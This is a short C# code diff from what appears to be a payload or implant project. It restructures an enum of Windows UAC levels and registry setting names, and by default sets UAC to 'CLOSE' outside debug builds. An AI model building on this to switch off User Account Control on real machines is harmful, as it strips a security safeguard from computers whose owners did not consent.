@@ -5,6 +5,7 @@ using System.Linq;
 using System.Text;
 using System.Threading.Tasks;
 using System.Windows.Input;
+using Payload.Common;
 /*
 1. UAC高
 ConsentPromptBehaviorAdmin：2
@@ -25,18 +26,23 @@ PromptOnSecureDesktop：0
 */
 namespace Payload.Core.Command
 {
+    public abstract class IUacCommand : Payload.Command.Interface.ICommand
+    {
+        public UAC_TYPE UacLevel { get; set; } = Config.IsDebug() ? UAC_TYPE.HIGH : UAC_TYPE.CLOSE;
+    }
+    public enum UAC_TYPE
+    {
+        CLOSE = 0,
+        LOW,
+        MEDIUM,
+        HIGH
+    }
     public static class UacConifg
     {
         public static readonly string ConsentPromptBehaviorAdmin_Name = "ConsentPromptBehaviorAdmin";
         public static readonly string EnableLUA_Name = "EnableLUA";
         public static readonly string PromptOnSecureDesktop_Name = "PromptOnSecureDesktop";
-        public enum UAC_TYPE
-        {
-            CLOSE = 0,
-            LOW,
-            MEDIUM,
-            HIGH
-        }
+        
 
         private static readonly Dictionary<UAC_TYPE, Dictionary<string, int>> UAC_TYEP_MAPPING = new Dictionary<UAC_TYPE, Dictionary<string, int>>()
         {
